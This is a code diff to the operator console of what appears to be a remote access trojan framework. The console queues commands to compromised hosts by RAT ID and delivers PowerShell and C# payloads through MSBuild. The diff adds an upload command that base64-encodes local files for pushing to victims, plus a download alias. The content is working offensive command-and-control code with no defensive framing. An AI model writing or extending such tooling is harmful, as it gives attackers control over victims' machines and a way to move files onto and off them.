@@ -130,6 +130,12 @@ def send_ratcode(ratID):
             ratcode = base64.b64encode(ratcode.encode('utf-8')).decode('utf-8')
             return(ratcode)
 
+def encode_file(filepath):
+    with open(Path(filepath).resolve() , "rb") as fd:
+        data = fd.read()
+    b64data = base64.b64encode(data).decode('utf-8')
+    return(b64data)   
+
 def create_psscript(filepath, extra_cmds=""):
     with open(Path(filepath).resolve() , "r") as fd:
         data = fd.read()
@@ -429,10 +435,10 @@ if __name__ == "__main__":
                             else:
                                 inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
                         except:
-                            print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
+                            print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                             continue
 
-                    elif(str.startswith(inp, "cs ")):
+                    elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
                         try:
                             filepath = inp.split(" ")[1]
                             if(types[ratID] == "ps1"):
@@ -440,8 +446,23 @@ if __name__ == "__main__":
                             else:
                                 inp = "cs " + msbuild_path + " " + send_csharper_msbuild_xml(inp, ratID)
                         except:
-                            print("[!] Could not open file " + filepath + " for reading or other unexpected error occured")
+                            print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                             continue
+
+                    elif(str.startswith(inp, "up ") or str.startswith(inp, "upload ")):
+                        try:
+                            localpath = inp.split(" ")[1]
+                            remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
+                            remotepath = remotepath.replace("\\", "\\\\")
+                            inp = "up " + encode_file(localpath) + " " + remotepath
+                        except:
+                            print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
+                            continue
+
+                    # Alias download=dl
+                    elif(str.startswith(inp, "dl ") or str.startswith(inp, "download ")):
+                        inp = " ".join(inp.split(" ")[1:])
+                        inp = "dl " + inp
 
                     print("[*] Queued command " + colors(inp) + " for " + colors(ratID))
                     if(ratID == "all"):
